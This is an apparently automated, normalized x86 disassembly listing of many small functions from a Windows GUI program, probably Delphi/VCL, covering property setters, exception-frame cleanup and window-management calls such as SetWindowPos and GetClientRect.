sub_3aacda7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aacdc4
call sub_3a645d8
xor eax eax
mov [ rw-data ] eax
retn
sub_3aacdd4
call sub_3a645d4
xor eax eax
mov [ rw-data ] eax
retn
sub_3aacde4
test dl dl
je r-xdata
mov [ eax + 0x40 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aace8c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x40 ]
movzx eax [ eax + 0x7e ]
jmp r-xdata
pop ebp
retn 0x4
sub_3aacea4
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_3aacef0
retn
sub_3aacfec
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x40 ]
mov si 0xffe5
call sub_3a6457c
pop esi
pop ebp
retn 0x4
sub_3aad0a8
push esi
mov edx eax
mov eax [ eax + 0x40 ]
mov si 0xffdb
call sub_3a6457c
pop esi
retn
sub_3aad0bc
push esi
mov edx eax
mov eax [ eax + 0x40 ]
mov si 0xffda
call sub_3a6457c
pop esi
retn
sub_3aad0d0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_3aad0dc
mov al 0x1
retn
sub_3aad0e0
mov eax 0x4
retn
sub_3aad0e8
retn
sub_3aadcf5
jmp sub_3a648a0
sub_3aadfcf
jmp sub_3a64b54
sub_3aae02b
jmp sub_3a64b54
sub_3aae09d
jmp sub_3a64b54
sub_3aae0ac
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_3aadd88
sub_3aae22f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_3a8a234
retn
sub_3aae245
jmp sub_3a64b54
sub_3aae26c
jmp sub_3a64b54
sub_3aae2ee
jmp sub_3a64b54
sub_3aae316
jmp sub_3a64b54
sub_3aae31d
mov esp ebp
pop ebp
retn
sub_3aae3d5
jmp sub_3a64b54
sub_3aae42c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_3aae3f8
mov [ ebx + 0x58 ] esi
sub_3aae580
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_3aae594
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_3aae67d
jmp sub_3a64b54
sub_3aae684
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aae707
jmp sub_3a64b54
sub_3aae70e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_3aae714
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3aae75c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3aae864
retn
sub_3aae888
retn
sub_3aaeba8
xor eax eax
retn
sub_3aaebac
movzx eax [ eax + 0x58 ]
retn
sub_3aaebb4
xor eax eax
retn
sub_3aaebb8
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_3aaebc0
mov eax [ eax + 0x30 ]
retn
sub_3aaec68
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_3aaed94
push ebx
mov ebx eax
movzx eax [ ebx + 0x5b ]
movzx eax [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_3aaede4
mov [ eax + 0x5d ] dl
retn
sub_3aaede8
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_3ab362c
sub_3aaedf8
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_3aaf400
jmp sub_3a64b54
sub_3aaf407
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_3aaf468
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x160 ] edx
retn
mov [ eax + 0x158 ] 0x1
sub_3aaf4e4
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_3aaf601
jmp sub_3a64b54
sub_3aaf608
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aaf788
push eax
xor ecx ecx
mov edx 0xb037
call sub_3ab0e78
retn
sub_3aaf957
cmp dl [ esi + 0x5c ]
je r-xdata
pop esi
retn
mov [ esi + 0x5c ] dl
test dl dl
je r-xdata
mov eax esi
mov si 0xffee
call sub_3a6457c
sub_3aafa06
jmp sub_3a64b54
sub_3aafa0d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3aafae0
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_3ab0e78
sub_3aafaf8
push 0x0
xor ecx ecx
mov edx 0xe
call sub_3ab0e78
retn
sub_3aafb08
push edx
mov edx 0xd
call sub_3ab0e78
retn
sub_3aafb14
mov edx [ eax + 0xa0 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_3aafb28
mov edx [ eax + 0x9c ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_3aafc0d
jmp sub_3a64b54
sub_3aafc14
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aafc1c
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_3ab0e78
sub_3aafc8c
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_3aafca0
movzx eax [ eax + 0x8e ]
xor al 0x1
retn
sub_3aafcac
movzx eax [ eax + 0x60 ]
xor al 0x1
retn
sub_3aafcb4
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_3ab0e78
sub_3aafcd8
cmp dl [ eax + 0x8d ]
je r-xdata
retn
mov [ eax + 0x8d ] dl
mov [ eax + 0x8e ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_3ab0e78
sub_3aafcfc
cmp dl [ eax + 0x8e ]
je r-xdata
retn
mov [ eax + 0x8e ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_3ab0e78
sub_3aafd74
movzx eax [ eax + 0x5a ]
xor al 0x1
retn
sub_3aafd7c
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_3ab0e78
sub_3aafda0
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_3ab0e78
sub_3aafdc4
cmp dx [ eax + 0x7c ]
je r-xdata
retn
mov [ eax + 0x7c ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_3ab0e78
sub_3aafde0
push ebx
mov ebx eax
call sub_3aac92c
cmp ebx eax
sete al
pop ebx
retn
sub_3aafe18
push esi
mov esi eax
mov dl 0x1
mov eax esi
mov si 0xffce
call sub_3a6457c
pop esi
retn
sub_3aaff6e
jmp sub_3a64b54
sub_3aaff75
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab0098
test [ eax + 0x50 ] 0x40
setne cl
movzx edx [ eax + 0x57 ]
call sub_3ab000c
retn
sub_3ab0174
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
sub_3ab0188
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_3ab026d
jmp sub_3a64b54
sub_3ab0290
xor eax eax
retn
sub_3ab0294
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_3ab02ac
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_3ab02c4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
movzx eax [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_3ab02e0
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
movzx edx [ edx + 0x4 ]
call sub_3ab02fc
retn
sub_3ab03e8
retn
sub_3ab03ec
cmp eax [ rw-data ]
sete al
retn
sub_3ab0460
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_3ab0580
push ebp
mov ebp esp
push esi
mov esi edx
mov edx esi
mov si 0xffd1
call sub_3a6457c
pop esi
pop ebp
retn 0x4
sub_3ab05c4
push ebx
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_3ab089f
jmp sub_3a64b54
sub_3ab08a6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab08b0
push esi
xor ecx ecx
mov si 0xffe8
call sub_3a6457c
pop esi
retn
sub_3ab08c0
push esi
mov cl 0x1
mov si 0xffe8
call sub_3a6457c
pop esi
retn
sub_3ab0b8c
jmp sub_3a64b54
sub_3ab0c34
push esi
mov esi eax
mov eax esi
mov si 0xffee
call sub_3a6457c
pop esi
retn
sub_3ab0c44
mov al 0x1
retn
sub_3ab0f50
retn
sub_3ab12a5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7e46c
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_3ab12c0
movzx eax [ eax + 0x5e ]
xchg edx eax
call sub_3a80ad8
retn
sub_3ab171c
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_3ab1d58
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_3ab1d68
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_3ab1d78
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_3ab1e90
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3ab1f1c
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_3aafc7c
mov [ ebx + 0x56 ] 0x1
sub_3ab1f40
mov [ edx + 0xc ] 0x1
retn
sub_3ab1fc0
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_3ab2228
jmp sub_3a64b54
sub_3ab222f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ab225c
mov eax [ r-xdata ]
retn
sub_3ab23f9
jmp sub_3a64b54
sub_3ab2400
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ab2520
mov eax [ eax + 0xac ]
retn
sub_3ab2588
push ebx
mov ebx eax
mov eax ebx
call sub_3ab0294
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_3ab25a4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_3ab275c
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_3ab2868
jmp sub_3a64b54
sub_3ab286f
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3ab289c
mov edx [ eax ]
call [ edx + 0x5c ]
retn
sub_3ab28a4
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_3ab291c
mov eax [ eax + 0x184 ]
xchg edx eax
call sub_3a81354
retn
sub_3ab292c
mov eax [ eax + 0x18c ]
xchg edx eax
call sub_3a81354
retn
sub_3ab293c
mov eax [ eax + 0x180 ]
xchg edx eax
call sub_3a81354
retn
sub_3ab294c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov [ ebx + 0x188 ] eax
pop esi
pop ebx
retn
sub_3ab2964
mov eax [ eax + 0x188 ]
xchg edx eax
call sub_3a81354
retn
sub_3ab2974
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov [ ebx + 0x184 ] eax
pop esi
pop ebx
retn
sub_3ab298c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov [ ebx + 0x18c ] eax
pop esi
pop ebx
retn
sub_3ab29a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov [ ebx + 0x180 ] eax
pop esi
pop ebx
retn
sub_3ab29e0
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_3ab29e8
call sub_3aae984
retn
sub_3ab2b0a
jmp sub_3a64b54
sub_3ab2cd8
jmp sub_3a64b54
sub_3ab2d28
jmp sub_3a64b54
sub_3ab3607
jmp sub_3a64b54
sub_3ab36b3
jmp sub_3a64b54
sub_3ab36c0
inc [ eax + 0x190 ]
retn
sub_3ab36c8
dec [ eax + 0x190 ]
cmp [ eax + 0x190 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_3ab36e8
sub_3ab36e8
xor edx edx
call sub_3ab362c
retn
sub_3ab37b5
jmp sub_3a64b54
sub_3ab37bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab38b2
jmp sub_3a64b54
sub_3ab3e4e
jmp sub_3a64b54
sub_3ab3e55
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab401d
jmp sub_3a64b54
sub_3ab4024
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab40f8
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_3ab42f5
jmp sub_3a64b54
sub_3ab42fc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x1b4 ] edx
pop ecx
pop ebp
retn
sub_3ab4518
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_3ab0e78
sub_3ab458c
jmp sub_3a64b54
sub_3ab46f4
jmp sub_3a64b54
sub_3ab4705
jmp sub_3a648a0
sub_3ab47d9
jmp sub_3a64b54
sub_3ab48f9
jmp sub_3a64b54
sub_3ab494b
jmp sub_3a64b54
sub_3ab4952
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ab495c
jmp sub_3a648a0
sub_3ab4961
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ab51fa
jmp sub_3a64b54
sub_3ab548a
jmp sub_3a64b54
sub_3ab54c7
jmp sub_3a64b54
sub_3ab54ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab54d8
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_3ab56ad
jmp sub_3a64b54
sub_3ab5876
jmp sub_3a64b54
sub_3ab587d
push 0xfffffffe
push 0xfffffffe
mov eax [ ebp - 0x8 ]
push eax
call InflateRect
mov esp ebp
pop ebp
retn
sub_3ab5ac9
jmp sub_3a64b54
sub_3ab5ad0
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xff7f
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3ab5bf3
jmp sub_3a64b54
sub_3ab5c1a
jmp sub_3a64b54
sub_3ab5cfd
jmp sub_3a64b54
sub_3ab5d36
jmp sub_3a64b54
sub_3ab5d88
push ebx
mov ebx eax
call sub_3a88868
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_3ab0e78
pop ebx
retn
sub_3ab5da4
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_3ab0e78
retn
sub_3ab5db8
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_3ab0e78
retn
sub_3ab5dc8
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_3ab0e78
retn
sub_3ab60c4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_3ab7fe4
mov eax esi
call sub_3ab28e8
pop esi
retn
sub_3ab61e0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_3ab6240
xor edx edx
mov eax esi
call sub_3ab9074
pop esi
retn
sub_3ab61fc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_3ab6370
mov dl 0x1
mov eax esi
call sub_3ab9074
pop esi
retn
sub_3ab6218
push esi
mov esi eax
mov [ esi + 0x241 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_3ab622c
push esi
mov esi eax
mov [ esi + 0x241 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_3ab635f
jmp sub_3a64b54
sub_3ab6366
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ab643f
jmp sub_3a64b54
sub_3ab6446
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ab6450
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
pop esi
retn
sub_3ab6460
retn
sub_3ab6464
push ebx
cmp [ eax + 0x1f2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
sub_3ab6484
push ebx
cmp [ eax + 0x1fa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1fc ]
call [ ebx + 0x1f8 ]
sub_3ab65ec
mov edx [ eax + 0x1ac ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_3ab66bc
retn
sub_3ab6808
jmp sub_3a64b54
sub_3ab680f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ab68db
jmp sub_3a64b54
sub_3ab6908
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1db ] 0x0
je r-xdata
retn
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x1b0 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_3ab699b
jmp sub_3a64b54
sub_3ab6bb4
push ebx
cmp [ eax + 0x212 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x214 ]
call [ ebx + 0x210 ]
sub_3ab6e90
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x1b4 ] eax
mov [ esi + 0x1da ] 0x0
pop esi
retn
sub_3ab6f6c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_3ab3c34
pop esi
retn
sub_3ab702c
push esi
mov esi eax
mov eax esi
mov si 0xffc0
call sub_3a6457c
pop esi
retn
sub_3ab705c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_3ab7070
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_3ab7084
call sub_3ab3bc4
retn
sub_3ab708c
call sub_3ab3bc4
retn
sub_3ab7094
call sub_3ab3bc4
retn
sub_3ab70cc
movzx edx [ eax + 0x1da ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x1b4 ]
push eax
call SetWindowPos
retn
sub_3ab713c
push ebx
mov ebx eax
mov eax ebx
call sub_3ab1d78
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x1a4 ]
call sub_3a89b20
mov dx 0xb009
mov eax ebx
call sub_3ab3c34
pop ebx
retn
sub_3ab72a0
call sub_3ab3bc4
retn
sub_3ab72a8
call sub_3ab3bc4
retn
sub_3ab72b0
call sub_3ab3bc4
retn
sub_3ab72b8
call sub_3ab3bc4
retn
sub_3ab7320
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_3ab7334
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_3ab77d6
jmp sub_3a64b54
sub_3ab77dd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ab78bc
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_3ab7a60
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_3ab0e78
retn
sub_3ab7b04
push ebx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x1b4 ]
push eax
call UpdateWindow
sub_3ab7b20
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8c ]
pop ebx
retn
sub_3ab7da0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_3ab7c38
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_3ab7df4
cmp edx [ eax + 0x19c ]
je r-xdata
retn
mov [ eax + 0x19c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_3ab0e78
sub_3ab7e14
cmp dl [ eax + 0x1d9 ]
je r-xdata
retn
mov [ eax + 0x1d9 ] dl
mov [ eax + 0x1dd ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_3ab0e78
sub_3ab7e38
movzx eax [ eax + 0x1dd ]
xor al 0x1
retn
sub_3ab7e44
cmp dl [ eax + 0x1dd ]
je r-xdata
retn
mov [ eax + 0x1dd ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_3ab0e78
sub_3ab7ef0
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_3ab7e94
retn
movsx edx dx
mov [ eax + 0x1d4 ] edx
retn
sub_3ab7fcc
jmp sub_3a64b54
sub_3ab7fd3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ab81f2
jmp sub_3a64b54
sub_3ab81f9
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3ab82bc
call sub_3ab0c48
retn
sub_3ab87fa
jmp sub_3a64b54
sub_3ab8890
mov eax [ r-xdata ]
retn
sub_3ab89f6
jmp sub_3a64b54
sub_3ab8b04
cmp dl [ eax + 0x195 ]
je r-xdata
retn
mov [ eax + 0x195 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_3ab0e78
sub_3ab8b24
cmp edx [ eax + 0x198 ]
je r-xdata
retn
mov [ eax + 0x198 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_3ab0e78
sub_3ab8e87
jmp sub_3a64b54
sub_3ab8ff1
jmp sub_3a64b54
sub_3ab9014
test [ eax + 0x52 ] 0x4
setne al
retn
sub_3ab905c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax esi
call sub_3ab9074
pop esi
retn
sub_3ab90a8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0xc
sub_3ab90b4
xor eax eax
retn
sub_3ab910c
call sub_3ab36e8
retn
sub_3ab9114
mov eax [ eax + 0x1a0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_3ab9258
jmp sub_3a64b54
sub_3ab925f
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ab9385
jmp sub_3a64b54
sub_3ab938c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
call sub_3a8a234
retn
sub_3ab93a8
jmp sub_3a64b54
sub_3ab93b4
retn
sub_3ab9488
mov [ edx + 0xc ] 0xffffffff
retn
sub_3ab94e6
jmp sub_3a64b54
sub_3ab94ed
pop ecx
pop ecx
pop ebp
retn
sub_3ab958d
jmp sub_3a64b54
sub_3ab9594
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab9600
mov edx [ eax ]
call [ edx + 0xb0 ]
retn
sub_3ab9697
jmp sub_3a64b54
sub_3ab969e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ab990f
jmp sub_3a64b54
sub_3ab9916
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab9a34
mov al 0x1
retn
sub_3ab9a78
push ebx
mov ebx eax
mov eax ebx
call sub_3abe994
or edx 0xffffffff
mov eax ebx
call sub_3ab9ad8
pop ebx
retn
sub_3ab9ad8
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x68 ] cx
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax ecx
xchg edx eax
call sub_3acce44
sub_3ab9c68
push ebx
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_3ab9c80
push ebx
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_3ab9d74
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_3ab5ae8
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_3ab9e0f
jmp sub_3a64b54
sub_3ab9e16
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab9e39
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3a8a234
retn
sub_3ab9e32
jmp sub_3a64b54
sub_3ab9e39
pop ebx
pop ecx
pop ebp
retn
sub_3ab9e40
retn
sub_3ab9ea8
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_3aba241
jmp sub_3a64b54
sub_3aba42c
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
